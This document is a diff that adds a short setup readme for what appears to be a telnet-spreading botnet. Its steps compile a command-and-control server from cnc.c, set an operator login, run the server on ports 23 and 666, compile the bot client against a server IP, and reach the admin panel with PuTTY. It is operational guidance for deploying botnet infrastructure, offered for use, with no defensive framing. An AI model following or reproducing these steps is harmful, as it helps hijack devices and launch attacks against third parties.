@@ -1,0 +1,29 @@
+====================================
+| Setup made by:                   |
+| @9wj67                           |
+| All source cred to selfrepnetis  |
+====================================
+
+
+Or Run my setup :)
+
+
+
+gcc cnc.c -o server -pthread [compiles server side]
+
+echo "root demon" >> login.txt  [obv your logins]
+
+screen ./server 23 1000 666 || Ex. [ screen ./server 23 1000 666  ]
+
+Press CTRL + A + D  [screens your Net to port 666
+
+python cc7.py bot.c <ip>  [compiles client side]
+
+--now go to putty, set connection type to Raw or Telnet, type server ip and change port to 666
+--login with root demon or go back to ssh and paste this command ( nano logins.txt ) and edit your login
+
+Wget:
+
+Admin port:666
+
+Bot port: 23
